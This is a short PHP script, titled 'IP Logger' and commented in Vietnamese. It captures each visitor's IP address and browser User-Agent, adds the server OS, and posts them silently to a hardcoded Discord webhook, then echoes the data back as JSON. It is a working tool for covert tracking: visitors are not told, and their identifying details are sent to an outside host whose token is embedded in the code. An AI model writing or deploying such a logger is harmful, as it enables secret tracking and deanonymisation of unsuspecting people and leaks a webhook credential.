<?php
header('Content-Type: application/json');
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$webhook_url = "https://discord.com/api/webhooks/1342132785200234526/-tUPPJSr-SSWxiykN-_NE0mRklP38PUTh7ipCSZBIxGW6s7ivIxDNkGtV9kkDWkiIfsv";

$data = [
    'ip' => $ip,
    'provider' => 'Unknown', // cần API để lấy
    'country' => 'Unknown', // cần API để lấy
    'city' => 'Unknown', // cần API để lấy
    'os' => php_uname('s'),
    'browser' => $userAgent
];

// Gửi dữ liệu lên Discord Webhook
$payload = json_encode([
    "content" => "New IP Logged!",
    "embeds" => [[
        "title" => "IP Logger",
        "fields" => [
            ["name" => "IP", "value" => $data['ip'], "inline" => true],
            ["name" => "OS", "value" => $data['os'], "inline" => true],
            ["name" => "Browser", "value" => $data['browser'], "inline" => true]
        ],
        "color" => 16711680
    ]]
]);

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

echo json_encode($data);
?>
